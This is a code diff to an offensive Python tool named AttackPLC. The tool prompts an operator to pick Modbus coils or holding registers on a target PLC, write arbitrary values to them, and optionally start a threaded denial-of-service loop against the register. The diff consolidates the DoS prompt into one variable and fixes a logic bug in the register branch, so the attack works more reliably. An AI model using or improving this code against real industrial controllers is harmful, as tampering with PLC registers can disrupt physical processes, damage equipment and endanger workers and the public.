@@ -440,19 +440,13 @@ class AttackPLC:
                 modbus_addr = addr + register
                 value = input("Enter new value [True/False]: ")
 
-                loop_coil = input("Do you want to perform a DoS on the register? [y/n] ")
-
-                # if loop == "y" or loop == "Y":
-                #    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, bool(value)))
-                #    thr1.start()
-
             elif choice_reg[2] == "W" or choice_reg[2] == "w":
                 reg_type = "register"
 
                 modbus_addr = int(choice_reg.split(choice_reg[2])[1])
                 value = input("Enter new value: ")
 
-                loop_hr = input("Do you want to perform a DoS on the register? [y/n] ")
+            loop = input("Do you want to perform a DoS on the register? [y/n] ")
 
             print("\n")
 
@@ -461,7 +455,7 @@ class AttackPLC:
                 print(f"Connecting to {plc}")
 
                 if reg_type == "coil":
-                    if loop_coil == "Y" or loop_coil == "y":
+                    if loop == "Y" or loop == "y":
                         thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, bool(value)))
                         thr1.start()
                     else:
@@ -473,7 +467,7 @@ class AttackPLC:
                         mb.close()
 
                 elif reg_type == "register":
-                    if loop_hr == "Y" or loop_coil == "y":
+                    if loop == "Y" or loop == "y":
                         thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, int(value)))
                         thr1.start()
                     else:
@@ -483,7 +477,6 @@ class AttackPLC:
                         mb.write_single_register(modbus_addr, int(value))
 
                         mb.close()
-
 
         else:
             plc = None
